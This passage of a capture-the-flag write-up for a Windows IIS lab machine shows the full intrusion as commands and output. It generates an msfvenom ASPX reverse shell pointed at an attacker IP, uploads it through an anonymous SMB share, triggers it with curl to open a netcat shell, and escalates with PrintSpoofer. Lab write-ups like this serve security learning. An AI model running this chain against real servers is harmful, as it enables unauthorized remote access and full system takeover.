Using workgroup WORKGROUP, user anonymous
smb://10.10.63.141/nt4wrksv/passwords.txt is already downloaded completely.
Downloaded 0b in 7 seconds
```

Now, let's check out the content of passwords.txt and it's base64 encoded.

```bash
┌💁  root @ 💻  austin-helper-x13 in 📁  Desktop
└❯ echo "Qm9iIC0gIVBxxxxxxxxxx" | base64 -d
Bob - xxxxxxxxxxxx
```

However, we have no way to utilise the credential we found !

Have you enumerate web? What about port 49663 ??

If you check out gobuster with the port 49663, you will notice, it's the same smb share accessible from port 49663.

In this case, we can generate our reverse shell payload and upload via the SMB, then access it with port 49663 which will get get reverse shell !

Sound pretty easy right ?! :smile:

We know the machines is Windows and using IIS, with nmap OS detection show it proabably Windows Server 2016.

We can now crafted our reverse shell payload.

```
C:\Users\crazy\Desktop
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_ATTACKER_IP LPORT=YOUR_ATTACKER_PORT_NUMBER -f aspx -o shell.aspx

No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3443 bytes
Saved as: shell.aspx
```

Now, copy the reverse shell payload to smb

```bash
┌💁  root @ 💻  austin-helper-x13 in 📁  Desktop
└❯ smbclient \\\\10.10.63.141\\nt4wrksv
Enter WORKGROUP\root's password:
Try "help" to get a list of possible commands.
smb: \> put shell.aspx
shell.aspx does not exist
smb: \> put shell.aspx
putting file shell.aspx as \shell.aspx (3.2 kb/s) (average 3.2 kb/s)
smb: \>
```

Start your netcat listener and activate the reverse shell payload.

```bash
┌💁  root @ 💻  austin-helper-x13 in 📁  Desktop
└❯ curl http://10.10.63.141:49663/nt4wrksv/shell.aspx
```

Then you have your reverse shell.

```dos
C:\Users\crazy\Desktop>nc8888
listening on [any] 8888 ...
connect to [x] from (UNKNOWN) [10.10.63.141] 49878
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

Time to get PrivEsc !

We can use the popular _PrintSpoofer_ attack here, google and research it !

Quite simple, just copy the _PrintSpoofer_ over smb.

Then you can issue command below to get PrivEsc !

```dos
PrintSpoofer.exe -i -c cmd
```

Now, you will get the user and root flag accordingly !!

<br />

---

> Do let me know any command or step can be improve or you have any question you can contact me via THM message or write down comment below or via FB




